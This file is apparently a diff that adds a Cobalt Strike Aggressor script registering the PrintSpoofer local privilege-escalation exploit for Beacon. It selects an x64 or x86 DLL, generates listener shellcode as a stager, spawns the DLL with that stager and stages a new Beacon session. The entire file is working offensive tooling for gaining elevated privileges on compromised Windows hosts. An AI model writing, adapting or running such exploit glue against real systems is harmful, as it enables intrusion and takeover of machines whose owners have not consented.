@@ -1,0 +1,19 @@
+sub printspoofer {
+    btask($1, "Task Beacon to run " . listener_describe($2) . "  PrintSpoofer");
+    
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = script_resource("x64.dll");
+    } else {
+        $arch = "x86";
+        $dll = script_resource("x86.dll");
+    }
+    $stager = shellcode($2, false, $arch);
+    
+    bdllspawn!($1, $dll, $stager, "PrintSpoofer local elevate privilege", 5000);
+    
+    bstage($1, $null, $2, $arch);
+}
+
+beacon_exploit_register("PrintSpoofer", "PrintSpoofer local elecate privilege", &printspoofer);
